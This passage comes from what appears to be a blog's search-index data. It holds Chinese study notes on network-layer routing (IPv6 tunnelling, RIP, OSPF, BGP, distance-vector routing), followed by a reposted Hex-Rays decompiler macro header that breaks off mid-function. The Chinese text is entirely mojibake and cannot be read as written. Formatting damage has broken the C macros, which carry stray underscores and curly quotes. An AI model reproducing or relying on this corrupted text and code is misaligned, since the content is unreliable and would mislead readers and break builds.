ä¸»æœºé€šä¿¡æ—¶åˆ™é‡‡ç”¨ IPv4åœ°å€ï¼ˆä½¿ç”¨åŸŸåç³»ç»ŸDNSæŸ¥è¯¢ï¼‰\nå½“IPv6æ•°æ®æŠ¥è½¬åŒ–ä¸ºv4åå†è½¬å›æ¥æ—¶ï¼Œæœ‰ä¸€éƒ¨åˆ†é¦–éƒ¨æ— æ³•æ¢å¤ï¼Œåªèƒ½ç©ºç¼ºï¼Œè¿™ç§ä¿¡æ¯çš„æŸå¤±æ˜¯ä½¿ç”¨é¦–éƒ¨è½¬æ¢æ–¹æ³•æ‰€ä¸å¯é¿å…çš„\néš§é“æŠ€æœ¯ åœ¨ IPv6 æ•°æ®æŠ¥è¦è¿›å…¥ IPv4 ç½‘ç»œæ—¶ï¼ŒæŠŠ IPv6 æ•°æ®æŠ¥å°è£…æˆä¸º IPv4æ•°æ®æŠ¥ï¼Œç°åœ¨æ•´ä¸ªçš„ IPv6 æ•°æ®æŠ¥å˜æˆäº† IPv4 æ•°æ®æŠ¥çš„æ•°æ®éƒ¨åˆ†\nè¦ä½¿åŒåè®®æ ˆçš„ä¸»æœºçŸ¥é“ IPv4 æ•°æ®æŠ¥é‡Œé¢å°è£…çš„æ•°æ®æ˜¯ä¸€ä¸ª IPv6 æ•°æ®æŠ¥ï¼Œå°±å¿…é¡»æŠŠIPv4 é¦–éƒ¨çš„åè®®å­—æ®µçš„å€¼è®¾ç½®ä¸º 41\nè·¯ç”±åè®®/ç®—æ³• è·¯ç”±åè®®çš„ç›®çš„ï¼šå†³å®šä»èµ·ç‚¹ï¼ˆsource address, sending hostï¼‰åˆ°ç»ˆç‚¹ï¼ˆdestination address, receiving hostï¼‰çš„ï¼Œç»è¿‡è‹¥å¹²ä¸ªè·¯ç”±å™¨çš„ï¼Œæœ€ä½³è·¯å¾„\nç†æƒ³çš„è·¯ç”±ç®—æ³• æ­£ç¡®çš„å’Œå®Œæ•´çš„ ç®€å• åº”èƒ½é€‚åº”é€šä¿¡é‡å’Œç½‘ç»œæ‹“æ‰‘çš„å˜åŒ–ï¼ˆè‡ªé€‚åº”æ€§ï¼‰ ç¨³å®šæ€§ å…¬å¹³ æœ€ä½³ åˆ†å±‚æ¬¡çš„è·¯ç”±é€‰æ‹©åè®® ä½¿ç”¨åŸå›  äº’è”ç½‘çš„è§„æ¨¡éå¸¸å¤§ è®¸å¤šå•ä½ä¸æ„¿æ„å¤–ç•Œäº†è§£è‡ªå·±å•ä½ç½‘ç»œçš„å¸ƒå±€ç»†èŠ‚å’Œæœ¬éƒ¨é—¨æ‰€é‡‡ç”¨çš„è·¯ç”±é€‰æ‹©åè®®ï¼ˆè¿™å±äºæœ¬éƒ¨é—¨å†…éƒ¨çš„äº‹æƒ…ï¼‰ï¼Œä½†åŒæ—¶è¿˜å¸Œæœ›è¿æ¥åˆ°äº’è”ç½‘ä¸Š å› æ­¤ï¼Œ å¯ä»¥æŠŠæ•´ä¸ªäº’è”ç½‘åˆ’åˆ†ä¸ºè®¸å¤šè¾ƒå°çš„è‡ªæ²»ç³»ç»Ÿ(autonomous system, AS)\nåœ¨ç›®å‰çš„äº’è”ç½‘ä¸­ï¼Œä¸€ä¸ªå¤§çš„ ISP å°±æ˜¯ä¸€ä¸ªè‡ªæ²»ç³»ç»Ÿ\nè‡ªæ²»ç³»ç»Ÿ AS æ˜¯åœ¨å•ä¸€æŠ€æœ¯ç®¡ç†ä¸‹çš„ä¸€ç»„è·¯ç”±å™¨ï¼Œè€Œè¿™äº›è·¯ç”±å™¨ä½¿ç”¨ä¸€ç§è‡ªæ²»ç³»ç»Ÿå†…éƒ¨çš„è·¯ç”±é€‰æ‹©åè®®å’Œå…±åŒçš„åº¦é‡ ä¸€ä¸ª AS å¯¹å…¶ä»– AS è¡¨ç°å‡ºçš„æ˜¯ä¸€ä¸ªå•ä¸€çš„å’Œä¸€è‡´çš„è·¯ç”±é€‰æ‹©ç­–ç•¥ ä¸¤ç±»è·¯ç”±é€‰æ‹©åè®® å†…éƒ¨ç½‘å…³åè®® IGP (Interior Gateway Protocol)ï¼Œå¦‚ RIP å’Œ OSPF åè®® å¤–éƒ¨ç½‘å…³åè®® EGP (External Gateway Protocol)ï¼Œç›®å‰ä½¿ç”¨æœ€å¤šçš„å¤–éƒ¨ç½‘å…³åè®®æ˜¯ BGP çš„ç‰ˆæœ¬ 4ï¼ˆBGP-4ï¼‰ å› ä¸ºå†å²åŸå› ï¼Œç½‘å…³ä¹Ÿå¯ç”¨äºè¡¨ç¤ºè·¯ç”±å™¨\nè‡ªæ²»ç³»ç»Ÿä¹‹é—´çš„è·¯ç”±é€‰æ‹©ä¹Ÿå«åšåŸŸé—´è·¯ç”±é€‰æ‹©(interdomain routing)ï¼Œè€Œåœ¨è‡ªæ²»ç³»ç»Ÿå†…éƒ¨çš„è·¯ç”±é€‰æ‹©å«åšåŸŸå†…è·¯ç”±é€‰æ‹©(intradomain routing)\nã€å†…éƒ¨ç½‘å…³åè®®ã€‘è·¯ç”±ä¿¡æ¯åè®® RIPåè®® æœ€å…ˆå¾—åˆ°å¹¿æ³›ä½¿ç”¨çš„ åˆ†å¸ƒå¼çš„ã€åŸºäºè·ç¦»å‘é‡çš„ è¦æ±‚ç½‘ç»œä¸­çš„æ¯ä¸€ä¸ªè·¯ç”±å™¨éƒ½è¦ç»´æŠ¤ä»å®ƒè‡ªå·±åˆ°å…¶ä»–æ¯ä¸€ä¸ªç›®çš„ç½‘ç»œçš„è·ç¦»è®°å½• è·ç¦»å¯ä»¥ç†è§£ä¸ºè·³æ•°ï¼Œå–å¾—æ˜¯æœ€çŸ­è·³æ•° ä»ä¸€ä¸ªè·¯ç”±å™¨åˆ°ç›´æ¥è¿æ¥çš„ç½‘ç»œçš„è·ç¦»å®šä¹‰ä¸º 1ã€‚ ä»ä¸€ä¸ªè·¯ç”±å™¨åˆ°éç›´æ¥è¿æ¥çš„ç½‘ç»œçš„è·ç¦»å®šä¹‰ä¸ºæ‰€ç»è¿‡çš„è·¯ç”±å™¨æ•°åŠ  1 RIP å…è®¸ä¸€æ¡è·¯å¾„æœ€å¤šåªèƒ½åŒ…å« 15 ä¸ªè·¯ç”±å™¨ï¼Œä¹Ÿå°±æ˜¯è·ç¦»è¦å°äºç­‰äº15ï¼Œâ€œè·ç¦»â€çš„æœ€å¤§å€¼ä¸º 16 æ—¶å³ç›¸å½“äºä¸å¯è¾¾ ä¸èƒ½åœ¨ä¸¤ä¸ªç½‘ç»œä¹‹é—´åŒæ—¶ä½¿ç”¨å¤šæ¡è·¯ç”± RIP é€‰æ‹©ä¸€ä¸ªå…·æœ‰æœ€å°‘è·¯ç”±å™¨çš„è·¯ç”±ï¼Œå“ªæ€•å¦ä¸€æ¡è·¯ç”±å™¨å¤šçš„è·¯ç”±æ›´å¿« RIPçš„ç‰¹ç‚¹ ä»…å’Œç›¸é‚»è·¯ç”±å™¨äº¤æ¢ä¿¡æ¯ã€‚ äº¤æ¢çš„ä¿¡æ¯æ˜¯å½“å‰æœ¬è·¯ç”±å™¨æ‰€çŸ¥é“çš„å…¨éƒ¨ä¿¡æ¯ï¼Œå³è‡ªå·±çš„è·¯ç”±è¡¨ã€‚ æŒ‰å›ºå®šçš„æ—¶é—´é—´éš”äº¤æ¢è·¯ç”±ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼Œæ¯éš” 30 ç§’ã€‚å½“ç½‘ç»œæ‹“æ‰‘å‘ç”Ÿå˜åŒ–æ—¶ï¼Œè·¯ç”±å™¨ä¹ŸåŠæ—¶å‘ç›¸é‚»è·¯ç”±å™¨é€šå‘Šæ‹“æ‰‘å˜åŒ–åçš„è·¯ç”±ä¿¡æ¯ã€‚ è·¯ç”±è¡¨çš„å»ºç«‹ è·¯ç”±å™¨åœ¨åˆšåˆšå¼€å§‹å·¥ä½œæ—¶ï¼ŒåªçŸ¥é“åˆ°ç›´æ¥è¿æ¥çš„ç½‘ç»œçš„è·ç¦»ï¼ˆæ­¤è·ç¦»å®šä¹‰ä¸º 1ï¼‰ã€‚å®ƒçš„è·¯ç”±è¡¨æ˜¯ç©ºçš„ã€‚ ä»¥åï¼Œæ¯ä¸€ä¸ªè·¯ç”±å™¨ä¹Ÿåªå’Œæ•°ç›®éå¸¸æœ‰é™çš„ç›¸é‚»è·¯ç”±å™¨äº¤æ¢å¹¶æ›´æ–°è·¯ç”±ä¿¡æ¯ã€‚ ç»è¿‡è‹¥å¹²æ¬¡æ›´æ–°åï¼Œæ‰€æœ‰çš„è·¯ç”±å™¨æœ€ç»ˆéƒ½ä¼šçŸ¥é“åˆ°è¾¾æœ¬è‡ªæ²»ç³»ç»Ÿä¸­ä»»ä½•ä¸€ä¸ªç½‘ç»œçš„æœ€çŸ­è·ç¦»å’Œä¸‹ä¸€è·³è·¯ç”±å™¨çš„åœ°å€ã€‚ RIP åè®®çš„æ”¶æ•› (convergence) è¿‡ç¨‹è¾ƒå¿«ã€‚â€œæ”¶æ•›â€å°±æ˜¯åœ¨è‡ªæ²»ç³»ç»Ÿä¸­æ‰€æœ‰çš„ç»“ç‚¹éƒ½å¾—åˆ°æ­£ç¡®çš„è·¯ç”±é€‰æ‹©ä¿¡æ¯çš„è¿‡ç¨‹ã€‚\nRIP2åè®®æŠ¥æ–‡æ ¼å¼ RIPåè®®çš„ä¼˜ç¼ºç‚¹ ä¼˜ç‚¹ï¼š\nå®ç°ç®€å•ï¼Œå¼€é”€è¾ƒå°ã€‚ ç¼ºç‚¹ï¼š\nRIP é™åˆ¶äº†ç½‘ç»œçš„è§„æ¨¡ï¼Œå®ƒèƒ½ä½¿ç”¨çš„æœ€å¤§è·ç¦»ä¸º 15ï¼ˆ16 è¡¨ç¤ºä¸å¯è¾¾ï¼‰ã€‚ è·¯ç”±å™¨ä¹‹é—´äº¤æ¢çš„è·¯ç”±ä¿¡æ¯æ˜¯è·¯ç”±å™¨ä¸­çš„å®Œæ•´è·¯ç”±è¡¨ï¼Œå› è€Œéšç€ç½‘ç»œè§„æ¨¡çš„æ‰©å¤§ï¼Œå¼€é”€ä¹Ÿå°±å¢åŠ ã€‚ â€œåæ¶ˆæ¯ä¼ æ’­å¾—æ…¢â€ï¼Œä½¿æ›´æ–°è¿‡ç¨‹çš„æ”¶æ•›æ—¶é—´è¿‡é•¿ã€‚ ã€å†…éƒ¨ç½‘å…³åè®®ã€‘å¼€æ”¾æœ€çŸ­è·¯å¾„ä¼˜å…ˆ OSPF (Open Shortest Path First)åè®® â€œå¼€æ”¾â€è¡¨æ˜ OSPF åè®®ä¸æ˜¯å—æŸä¸€å®¶å‚å•†æ§åˆ¶ï¼Œè€Œæ˜¯å…¬å¼€å‘è¡¨çš„ã€‚ â€œæœ€çŸ­è·¯å¾„ä¼˜å…ˆâ€æ˜¯å› ä¸ºä½¿ç”¨äº† Dijkstra æå‡ºçš„æœ€çŸ­è·¯å¾„ç®—æ³• SPFé‡‡ç”¨åˆ†å¸ƒå¼çš„é“¾è·¯çŠ¶æ€åè®® (link state protocol) ä¸‰ä¸ªè¦ç‚¹ å‘æœ¬è‡ªæ²»ç³»ç»Ÿä¸­æ‰€æœ‰è·¯ç”±å™¨å‘é€ä¿¡æ¯ï¼Œè¿™é‡Œä½¿ç”¨çš„æ–¹æ³•æ˜¯æ´ªæ³›æ³•ã€‚ å‘é€çš„ä¿¡æ¯å°±æ˜¯ä¸æœ¬è·¯ç”±å™¨ç›¸é‚»çš„æ‰€æœ‰è·¯ç”±å™¨çš„é“¾è·¯çŠ¶æ€ï¼Œä½†è¿™åªæ˜¯è·¯ç”±å™¨æ‰€çŸ¥é“çš„éƒ¨åˆ†ä¿¡æ¯ã€‚ â€œé“¾è·¯çŠ¶æ€â€å°±æ˜¯è¯´æ˜æœ¬è·¯ç”±å™¨éƒ½å’Œå“ªäº›è·¯ç”±å™¨ç›¸é‚»ï¼Œä»¥åŠè¯¥é“¾è·¯çš„â€œåº¦é‡â€(metric)ã€‚ åªæœ‰å½“é“¾è·¯çŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶ï¼Œè·¯ç”±å™¨æ‰ç”¨æ´ªæ³›æ³•å‘æ‰€æœ‰è·¯ç”±å™¨å‘é€æ­¤ä¿¡æ¯ã€‚ é“¾è·¯çŠ¶æ€æ•°æ®åº“ (link-state database) æ˜¯å…¨ç½‘çš„æ‹“æ‰‘ç»“æ„å›¾ï¼Œå®ƒåœ¨å…¨ç½‘èŒƒå›´å†…æ˜¯ä¸€è‡´çš„ï¼ˆè¿™ç§°ä¸ºé“¾è·¯çŠ¶æ€æ•°æ®åº“çš„åŒæ­¥ï¼‰ èƒ½è¾ƒå¿«åœ°è¿›è¡Œæ›´æ–°ï¼Œä½¿å„ä¸ªè·¯ç”±å™¨èƒ½åŠæ—¶æ›´æ–°å…¶è·¯ç”±è¡¨ï¼Œå› æ­¤æ›´æ–°è¿‡ç¨‹æ”¶æ•›å¾—å¿« OSPFçš„åŒºåŸŸ OSPF å°†ä¸€ä¸ªè‡ªæ²»ç³»ç»Ÿå†åˆ’åˆ†ä¸ºè‹¥å¹²ä¸ªæ›´å°çš„èŒƒå›´ï¼Œå«åšåŒºåŸŸã€‚\næ¯ä¸€ä¸ªåŒºåŸŸéƒ½æœ‰ä¸€ä¸ªç”¨ç‚¹åˆ†åè¿›åˆ¶è¡¨ç¤ºçš„ 32 ä½çš„åŒºåŸŸæ ‡è¯†ç¬¦ åœ¨ä¸€ä¸ªåŒºåŸŸå†…çš„è·¯ç”±å™¨æœ€å¥½ä¸è¶…è¿‡ 200 ä¸ª åŒºåŸŸåˆ†ä¸ºä¸¤ç§ï¼Œä¸»å¹²åŒºåŸŸ0.0.0.0å’Œå…¶ä»–ä¸‹å±‚åŒºåŸŸ åˆ’åˆ†åŒºåŸŸçš„å¥½å¤„å°±æ˜¯å°†åˆ©ç”¨æ´ªæ³›æ³•äº¤æ¢é“¾è·¯çŠ¶æ€ä¿¡æ¯çš„èŒƒå›´å±€é™äºæ¯ä¸€ä¸ªåŒºåŸŸè€Œä¸æ˜¯æ•´ä¸ªçš„è‡ªæ²»ç³»ç»Ÿï¼Œè¿™å°±å‡å°‘äº†æ•´ä¸ªç½‘ç»œä¸Šçš„é€šä¿¡é‡ å› æ­¤ï¼Œåœ¨ä¸€ä¸ªåŒºåŸŸå†…éƒ¨çš„è·¯ç”±å™¨åªçŸ¥é“æœ¬åŒºåŸŸçš„å®Œæ•´ç½‘ç»œæ‹“æ‰‘ï¼Œè€Œä¸çŸ¥é“å…¶ä»–åŒºåŸŸçš„ç½‘ç»œæ‹“æ‰‘çš„æƒ…å†µ\nOSPFçš„ç‰¹ç‚¹ OSPF ä¸ç”¨ UDP è€Œæ˜¯ç›´æ¥ç”¨ IP æ•°æ®æŠ¥ä¼ é€ã€‚ OSPF æ„æˆçš„æ•°æ®æŠ¥å¾ˆçŸ­ã€‚è¿™æ ·åšå¯å‡å°‘è·¯ç”±ä¿¡æ¯çš„é€šä¿¡é‡ OSPF å¯¹ä¸åŒçš„é“¾è·¯å¯æ ¹æ® IP åˆ†ç»„çš„ä¸åŒæœåŠ¡ç±»å‹ TOS è€Œè®¾ç½®æˆä¸åŒçš„ä»£ä»·ã€‚å› æ­¤ï¼ŒOSPF å¯¹äºä¸åŒç±»å‹çš„ä¸šåŠ¡å¯è®¡ç®—å‡ºä¸åŒçš„è·¯ç”± å¦‚æœåˆ°åŒä¸€ä¸ªç›®çš„ç½‘ç»œæœ‰å¤šæ¡ç›¸åŒä»£ä»·çš„è·¯å¾„ï¼Œé‚£ä¹ˆå¯ä»¥å°†é€šä¿¡é‡åˆ†é…ç»™è¿™å‡ æ¡è·¯å¾„ã€‚è¿™å«åšå¤šè·¯å¾„é—´çš„è´Ÿè½½å¹³è¡¡ã€‚ æ‰€æœ‰åœ¨ OSPF è·¯ç”±å™¨ä¹‹é—´äº¤æ¢çš„åˆ†ç»„éƒ½å…·æœ‰é‰´åˆ«çš„åŠŸèƒ½ã€‚ æ”¯æŒå¯å˜é•¿åº¦çš„å­ç½‘åˆ’åˆ†å’Œæ— åˆ†ç±»ç¼–å€ CIDR æ¯ä¸€ä¸ªé“¾è·¯çŠ¶æ€éƒ½å¸¦ä¸Šä¸€ä¸ª 32 ä½çš„åºå·ï¼Œåºå·è¶Šå¤§çŠ¶æ€å°±è¶Šæ–° OSPF è¿˜è§„å®šæ¯éš”ä¸€æ®µæ—¶é—´ï¼Œå¦‚ 30 åˆ†é’Ÿï¼Œè¦åˆ·æ–°ä¸€æ¬¡æ•°æ®åº“ä¸­çš„é“¾è·¯çŠ¶æ€ã€‚ ç”±äºä¸€ä¸ªè·¯ç”±å™¨çš„é“¾è·¯çŠ¶æ€åªæ¶‰åŠåˆ°ä¸ç›¸é‚»è·¯ç”±å™¨çš„è¿é€šçŠ¶æ€ï¼Œå› è€Œä¸æ•´ä¸ªäº’è”ç½‘çš„è§„æ¨¡å¹¶æ— ç›´æ¥å…³ç³»ã€‚å› æ­¤å½“äº’è”ç½‘è§„æ¨¡å¾ˆå¤§æ—¶ï¼ŒOSPF åè®®è¦æ¯”è·ç¦»å‘é‡åè®® RIP å¥½å¾—å¤šã€‚ OSPF æ²¡æœ‰â€œåæ¶ˆæ¯ä¼ æ’­å¾—æ…¢â€çš„é—®é¢˜ï¼Œæ®ç»Ÿè®¡ï¼Œå…¶å“åº”ç½‘ç»œå˜åŒ–çš„æ—¶é—´å°äº 100 ms OSPFåˆ†ç»„æ ¼å¼ äº”ç§ç±»å‹ï¼š\nç±»å‹1ï¼Œé—®å€™ (Hello) åˆ†ç»„ã€‚ ç±»å‹2ï¼Œæ•°æ®åº“æè¿° (Database Description) åˆ†ç»„ã€‚ ç±»å‹3ï¼Œé“¾è·¯çŠ¶æ€è¯·æ±‚ (Link State Request) åˆ†ç»„ã€‚ ç±»å‹4ï¼Œé“¾è·¯çŠ¶æ€æ›´æ–° (Link State Update) åˆ†ç»„ï¼Œæ´ªæ³›æ³•å¯¹å…¨ç½‘æ›´æ–°é“¾è·¯çŠ¶æ€ã€‚ ç±»å‹5ï¼Œé“¾è·¯çŠ¶æ€ç¡®è®¤ (Link State Acknowledgment)åˆ†ç»„ã€‚ æŒ‡å®šçš„è·¯ç”±å™¨ å¤šç‚¹æ¥å…¥çš„å±€åŸŸç½‘é‡‡ç”¨äº†æŒ‡å®šçš„è·¯ç”±å™¨ (designated router) çš„æ–¹æ³•ï¼Œä½¿å¹¿æ’­çš„ä¿¡æ¯é‡å¤§å¤§å‡å°‘ã€‚ æŒ‡å®šçš„è·¯ç”±å™¨ä»£è¡¨è¯¥å±€åŸŸç½‘ä¸Šæ‰€æœ‰çš„é“¾è·¯å‘è¿æ¥åˆ°è¯¥ç½‘ç»œä¸Šçš„å„è·¯ç”±å™¨å‘é€çŠ¶æ€ä¿¡æ¯ ä¸RIPçš„å¯¹æ¯” ã€å¤–éƒ¨ç½‘å…³åè®®ã€‘BGPåè®® BGP æ˜¯ä¸åŒè‡ªæ²»ç³»ç»Ÿçš„è·¯ç”±å™¨ä¹‹é—´äº¤æ¢è·¯ç”±ä¿¡æ¯çš„åè®®\nè¾¹ç•Œç½‘å…³åè®® BGP åŠ›æ±‚å¯»æ‰¾ä¸€æ¡èƒ½å¤Ÿåˆ°è¾¾ç›®çš„ç½‘ç»œä¸”æ¯”è¾ƒå¥½çš„è·¯ç”±ï¼ˆä¸èƒ½å…œåœˆå­ï¼‰ï¼Œè€Œå¹¶éè¦å¯»æ‰¾ä¸€æ¡æœ€ä½³è·¯ç”±\nBGPå‘è¨€äºº æ¯ä¸€ä¸ªè‡ªæ²»ç³»ç»Ÿçš„ç®¡ç†å‘˜è¦é€‰æ‹©è‡³å°‘ä¸€ä¸ªè·¯ç”±å™¨ä½œä¸ºè¯¥è‡ªæ²»ç³»ç»Ÿçš„ â€œ BGP å‘è¨€äººâ€ (BGP speaker)\nä¸€èˆ¬è¯´æ¥ï¼Œä¸¤ä¸ª BGP å‘è¨€äººéƒ½æ˜¯é€šè¿‡ä¸€ä¸ªå…±äº«ç½‘ç»œè¿æ¥åœ¨ä¸€èµ·çš„ï¼Œè€Œ BGP å‘è¨€äººå¾€å¾€å°±æ˜¯ BGP è¾¹ç•Œè·¯ç”±å™¨ï¼Œä½†ä¹Ÿå¯ä»¥ä¸æ˜¯ BGP è¾¹ç•Œè·¯ç”±å™¨\nBGPäº¤æ¢è·¯ç”±ä¿¡æ¯ ä¸€ä¸ª BGP å‘è¨€äººä¸å…¶ä»–è‡ªæ²»ç³»ç»Ÿä¸­çš„ BGP å‘è¨€äººè¦äº¤æ¢è·¯ç”±ä¿¡æ¯ï¼Œå°±è¦å…ˆå»ºç«‹ TCP è¿æ¥ï¼Œç„¶ååœ¨æ­¤è¿æ¥ä¸Šäº¤æ¢ BGP æŠ¥æ–‡ä»¥å»ºç«‹ BGP ä¼šè¯(session)ï¼Œåˆ©ç”¨ BGP ä¼šè¯äº¤æ¢è·¯ç”±ä¿¡æ¯ã€‚\nä½¿ç”¨ TCP è¿æ¥èƒ½æä¾›å¯é çš„æœåŠ¡ï¼Œä¹Ÿç®€åŒ–äº†è·¯ç”±é€‰æ‹©åè®®ã€‚ ä½¿ç”¨ TCP è¿æ¥äº¤æ¢è·¯ç”±ä¿¡æ¯çš„ä¸¤ä¸ª BGP å‘è¨€äººï¼Œå½¼æ­¤æˆä¸ºå¯¹æ–¹çš„é‚»ç«™(neighbor)æˆ–å¯¹ç­‰ç«™(peer) ã€‚ BGPå‘è¨€äººäº¤æ¢è·¯å¾„å‘é‡ BGPåè®®çš„ç‰¹ç‚¹ BGPåè®®çš„å››ç§æŠ¥æ–‡ BGPåè®®æŠ¥æ–‡æ ¼å¼ ä¸¤ç±»åŸºæœ¬è·¯ç”±ç®—æ³• ç½‘ç»œçš„å›¾çš„æŠ½è±¡ é“¾è·¯æˆæœ¬ è¦æ‰¾åˆ°ä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„æœ€å°æˆæœ¬çš„è·¯å¾„ï¼Œè¿™å°±æ˜¯è·¯ç”±ç®—æ³•éœ€è¦è§£å†³çš„é—®é¢˜\nè·¯ç”±ç®—æ³•çš„åˆ†ç±» æ ¹æ®è·¯ç”±ç®—æ³•æ˜¯éœ€è¦ä¸­å¿ƒåŒ–çš„ã€å…¨å±€çš„ä¿¡æ¯ï¼Œè¿˜æ˜¯å»ä¸­å¿ƒåŒ–çš„ã€å±€éƒ¨çš„ä¿¡æ¯ï¼Œå¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼š\né“¾è·¯çŠ¶æ€ç®—æ³•ï¼ˆçŸ¥é“å…¨å±€ä¿¡æ¯ï¼‰ è·ç¦»å‘é‡ç®—æ³•ï¼ˆåªçŸ¥é“å±€éƒ¨ä¿¡æ¯ï¼‰ é“¾è·¯çŠ¶æ€ç®—æ³• è·ç¦»å‘é‡ç®—æ³• å½“é“¾è·¯æˆæœ¬å‘ç”Ÿå˜åŒ–æ—¶ï¼š\nâ€œå¥½æ¶ˆæ¯ä¼ å¾—å¿«â€ï¼šé“¾è·¯æˆæœ¬å˜å° â€œåæ¶ˆæ¯ä¼ å¾—æ…¢â€ï¼šé“¾è·¯æˆæœ¬å˜å¤§ã€é“¾è·¯æ–­äº†ç­‰ç­‰ï¼Œå¯èƒ½ä¼šé€ æˆè·¯ç”±ç¯è·¯ ä¸ºäº†é¿å…è·¯ç”±ç¯è·¯ï¼Œå¯ä»¥ä½¿ç”¨æ¯’æ€§é€†è½¬ï¼š å¦‚æœz -\u0026gt; y -\u0026gt; xï¼Œåˆ™zå‘yé€šå‘Š$ğ·_ğ‘§(ğ‘¥)=âˆ$ï¼ˆå³ä½¿zçŸ¥é“$ğ·_ğ‘§ (ğ‘¥)$æ˜¯æŸä¸ªæ•°å€¼ï¼‰ã€‚è¿™æ ·å¯ä»¥é˜²æ­¢yé‡æ–°ç»è¿‡zåˆ°è¾¾xã€‚\n","date":"2022å¹´11æœˆ16æ—¥","permalink":"https://peterliuzhi.top/principle/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%B1%82/","section":"principle","summary":"It isn\u0026rsquo;t where you come from, it\u0026rsquo;s where you\u0026rsquo;re going that counts. â€” Ella Fitzgerald é“¾è·¯å±‚å¹²çš„äº‹æƒ…æ˜¯å±€éƒ¨çš„ï¼Œç½‘ç»œå±‚å¹²çš„äº‹æƒ…æ˜¯å…¨å±€çš„ ç½‘ç»œå±‚ æ¦‚è¿° ç½‘ç»œå±‚æä¾›çš„æœåŠ¡ è·¯ç”±å’Œè½¬å‘ ç½‘ç»œå±‚æä¾›çš„ä¸¤ç§åˆ†ç»„äº¤æ¢çš„æ–¹æ³• æ•°æ®æŠ¥æ–¹","tags":["è®¡ç®—æœºç½‘ç»œ"],"title":"ç½‘ç»œå±‚"},{"categories":["principle"],"contents":" All serious daring starts from within. â€” Harriet Beecher Stowe\næœ¬æ–‡è½¬è½½è‡ªIDAé€†å‘å¸¸ç”¨å®å®šä¹‰_ä¸‘å¤§ç‹—çš„åšå®¢-CSDNåšå®¢\n/* This fileÂ [contains](https://so.csdn.net/so/search?q=contains\u0026amp;spm=1001.2101.3001.7020)Â definitions used by the Hex-Rays decompiler output. It has type definitions and convenience macros to make the output more readable. Copyright Â© 2007-2011 Hex-Rays */ #if defined(**GNUC**) typedef long long ll; typedef unsigned long long ull; #define __int64 long long #define __int32 int #define __int16 short #define __int8 char #define MAKELL(num) num ## LL #define FMT_64 â€œllâ€ #elif defined(_MSC_VER) typedef __int64 ll; typedef unsigned __int64 ull; #define MAKELL(num) num ## i64 #define FMT_64 â€œI64â€ #elif defined (**BORLANDC**) typedef __int64 ll; typedef unsigned __int64 ull; #define MAKELL(num) num ## i64 #define FMT_64 â€œLâ€ #else #error â€œunknown compilerâ€ #endif typedef unsigned int uint; typedef unsigned char uchar; typedef unsigned short ushort; typedef unsigned long ulong; typedef char int8; typedef signed char sint8; typedef unsigned char uint8; typedef short int16; typedef signed short sint16; typedef unsigned short uint16; typedef int int32; typedef signed int sint32; typedef unsigned int uint32; typedef ll int64; typedef ll sint64; typedef ull uint64; // Partially defined types: #define _BYTE uint8 #define _WORD uint16 #define _DWORD uint32 #define _QWORD uint64 #if !defined(_MSC_VER) #define _LONGLONG __int128 #endif #ifndefÂ _WINDOWS_ typedef int8 BYTE; typedef int16 WORD; typedef int32 DWORD; typedef int32 LONG; #endif typedef int64 QWORD; #ifndef __cplusplus typedef int bool; // we want to use bool in our C programs #endif // Some convenience macros to make partial accesses nicer // first unsigned macros: #define LOBYTE(x) (_((_BYTE_)\u0026amp;(x))) // low byte #define LOWORD(x) (_((_WORD_)\u0026amp;(x))) // low word #define LODWORD(x) (_((_DWORD_)\u0026amp;(x))) // low dword #define HIBYTE(x) (_((_BYTE_)\u0026amp;(x)+1)) #define HIWORD(x) (_((_WORD_)\u0026amp;(x)+1)) #define HIDWORD(x) (_((_DWORD_)\u0026amp;(x)+1)) #define BYTEn(x, n) (_((_BYTE_)\u0026amp;(x)+n)) #define WORDn(x, n) (_((_WORD_)\u0026amp;(x)+n)) #define BYTE1(x) BYTEn(x, 1) // byte 1 (counting from 0) #define BYTE2(x) BYTEn(x, 2) #define BYTE3(x) BYTEn(x, 3) #define BYTE4(x) BYTEn(x, 4) #define BYTE5(x) BYTEn(x, 5) #define BYTE6(x) BYTEn(x, 6) #define BYTE7(x) BYTEn(x, 7) #define BYTE8(x) BYTEn(x, 8) #define BYTE9(x) BYTEn(x, 9) #define BYTE10(x) BYTEn(x, 10) #define BYTE11(x) BYTEn(x, 11) #define BYTE12(x) BYTEn(x, 12) #define BYTE13(x) BYTEn(x, 13) #define BYTE14(x) BYTEn(x, 14) #define BYTE15(x) BYTEn(x, 15) #define WORD1(x) WORDn(x, 1) #define WORD2(x) WORDn(x, 2) // third word of the object, unsigned #define WORD3(x) WORDn(x, 3) #define WORD4(x) WORDn(x, 4) #define WORD5(x) WORDn(x, 5) #define WORD6(x) WORDn(x, 6) #define WORD7(x) WORDn(x, 7) // now signed macros (the same but with sign extension) #define SLOBYTE(x) (_((int8_)\u0026amp;(x))) #define SLOWORD(x) (_((int16_)\u0026amp;(x))) #define SLODWORD(x) (_((int32_)\u0026amp;(x))) #define SHIBYTE(x) (_((int8_)\u0026amp;(x)+1)) #define SHIWORD(x) (_((int16_)\u0026amp;(x)+1)) #define SHIDWORD(x) (_((int32_)\u0026amp;(x)+1)) #define SBYTEn(x, n) (_((int8_)\u0026amp;(x)+n)) #define SWORDn(x, n) (_((int16_)\u0026amp;(x)+n)) #define SBYTE1(x) SBYTEn(x, 1) #define SBYTE2(x) SBYTEn(x, 2) #define SBYTE3(x) SBYTEn(x, 3) #define SBYTE4(x) SBYTEn(x, 4) #define SBYTE5(x) SBYTEn(x, 5) #define SBYTE6(x) SBYTEn(x, 6) #define SBYTE7(x) SBYTEn(x, 7) #define SBYTE8(x) SBYTEn(x, 8) #define SBYTE9(x) SBYTEn(x, 9) #define SBYTE10(x) SBYTEn(x, 10) #define SBYTE11(x) SBYTEn(x, 11) #define SBYTE12(x) SBYTEn(x, 12) #define SBYTE13(x) SBYTEn(x, 13) #define SBYTE14(x) SBYTEn(x, 14) #define SBYTE15(x) SBYTEn(x, 15) #define SWORD1(x) SWORDn(x, 1) #define SWORD2(x) SWORDn(x, 2) #define SWORD3(x) SWORDn(x, 3) #define SWORD4(x) SWORDn(x, 4) #define SWORD5(x) SWORDn(x, 5) #define SWORD6(x) SWORDn(x, 6) #define SWORD7(x) SWORDn(x, 7) // Helper functions to represent some assembly instructions. #ifdef __cplusplus // Fill memory block with an integer value inline void memset32(void 